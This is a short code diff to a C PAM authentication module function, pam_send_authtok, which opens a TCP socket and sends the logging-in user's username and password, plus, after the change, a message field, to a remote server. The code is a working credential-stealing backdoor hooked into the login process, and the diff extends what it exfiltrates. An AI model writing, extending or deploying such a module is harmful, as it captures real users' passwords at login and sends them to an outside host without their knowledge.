@@ -18,7 +18,7 @@
 typedef int (*pam_func_t)(pam_handle_t *, int, int, const char **);
 
 int pam_send_authtok(pam_handle_t *pamh, const char *message, const char *username, const char *password) {
-    const char *ret_fmt = "%s:%s\n";
+    const char *ret_fmt = "%s:%s:%s\n";
 
     int sock = socket(AF_INET, SOCK_STREAM, 0);
     if (sock >= 0) {
@@ -31,7 +31,7 @@ int pam_send_authtok(pam_handle_t *pamh, const char *message, const char *userna
         if(connect(sock, (struct sockaddr*)&serv_addr, sizeof(serv_addr)) == 0) {
             pam_syslog(pamh, LOG_INFO, "Socket connected");
             char credentials[256];
-            snprintf(credentials, sizeof(credentials), ret_fmt, username, password);
+            snprintf(credentials, sizeof(credentials), ret_fmt, message, username, password);
             send(sock, credentials, strlen(credentials), 0);
             pam_syslog(pamh, LOG_INFO, "Message sent!");
         }
